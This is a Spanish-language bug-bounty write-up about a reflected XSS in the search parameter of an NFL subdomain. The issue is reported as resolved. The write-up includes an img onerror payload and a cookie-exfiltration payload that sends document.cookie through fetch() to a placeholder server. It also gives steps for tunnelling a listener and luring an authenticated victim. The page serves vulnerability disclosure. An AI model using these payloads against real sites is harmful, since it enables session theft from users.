---
layout: default
---

<div class="container">
  <div class="lang-switcher">
    <a href="/en/bounties/nfl-xss-search-query/" class="lang-btn">English (EN)</a>
    <a href="./" class="lang-btn active">Español (ES)</a>
  </div>
<article>
  <a href="/es/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>

  <div class="bounty-header">
    <h1>NFL: XSS Reflejado en Parámetro de Búsqueda</h1>
    <p style="color: var(--p3); font-weight: 600;">National Football League (NFL) - Infraestructura Digital</p>
  </div>

  <div class="bounty-content">
    <h2>🎯 Resumen de la Vulnerabilidad</h2>
    <p>Identificamos una vulnerabilidad de Cross-Site Scripting (XSS) reflejado en el dominio público <code>hbcutournament.nfl.com</code>. La vulnerabilidad reside en el parámetro del fragmento de URL de la página de resultados de búsqueda (<code>?q=</code>), que procesa incorrectamente la entrada del usuario sin el saneamiento adecuado.</p>

    <h2>⚙️ URLs Afectadas</h2>
    <pre><code>https://hbcutournament.nfl.com/resources?q=
https://hbcutournament.nfl.com/blogs?q=</code></pre>

    <h2>🛠️ Payloads de Prueba de Concepto</h2>
    
    <h3>Inyección HTML</h3>
    <p>Lo primero que probamos en el campo de búsqueda fue una simple inyección HTML:</p>
    <pre><code>&lt;h1&gt;This is a HTML Injection test&lt;/h1&gt; --- This is a normal text.</code></pre>
    <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - HTML Injection.png" alt="Inyección HTML">

    <h3>XSS Reflejado</h3>
    <p>Después de probar varios payloads, descubrimos que la etiqueta <code>&lt;img&gt;</code> funciona:</p>
    <pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
    <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Alert 1.png" alt="Prueba de Alerta">

    <h3>XSS Reflejado con exfiltración de Cookies</h3>
    <p>Tras verificar que podíamos ejecutar código JavaScript, intentamos exfiltrar las cookies para robar datos de sesión.</p>
    <pre><code>&lt;img/src/onerror=fetch("http://tu-servidor-web/"+encodeURIComponent(document.cookie))&gt;</code></pre>
    <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration.png" alt="Payload de Exfiltración de Cookies">
    <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration Result.png" alt="Resultado de la Exfiltración">

    <h2>🚀 Pasos para Reproducir</h2>
    <ol>
      <li>Inicia un servidor web local: <code>python3 -m http.server 8000</code></li>
      <li>Exponlo públicamente (por ejemplo, usando Serveo): <code>ssh -R 80:localhost:8000 serveo.net</code></li>
      <li>Prepara la URL maliciosa con la dirección de tu servidor.</li>
      <li>Comparte la URL con un usuario autenticado.</li>
      <li>Recibe las cookies de la víctima de nuestro lado.</li>
    </ol>

    <h2>🤝 Detalle de Colaboración</h2>
    <p>Esta investigación fue realizada en un esfuerzo conjunto con los siguientes investigadores:</p>
    <ul>
      <li><strong>{{ site.researchers.ivan.name }}</strong> (Investigador principal)</li>
      <li><strong>{{ site.researchers.diego.name }}</strong> (Analista de seguridad)</li>
    </ul>

    <div class="card-grid" style="margin-top: 3rem;">
      <div class="glass-card">
        <small>Estado</small>
        <strong>Resuelto y Verificado</strong>
      </div>
      <div class="glass-card">
        <small>Severidad</small>
        <strong>Alta (reportada como P3)</strong>
      </div>
    </div>
  </div>
</article>
</div>

<!-- Image Zoom Overlay -->
<div id="zoomOverlay" class="zoom-overlay">
  <img id="zoomImg" src="" alt="Imagen Ampliada">
</div>

<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    const overlay = document.getElementById('zoomOverlay');
    const zoomImg = document.getElementById('zoomImg');
    zoomImg.src = img.src;
    overlay.classList.add('active');
  });
});

document.getElementById('zoomOverlay').addEventListener('click', () => {
  document.getElementById('zoomOverlay').classList.remove('active');
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
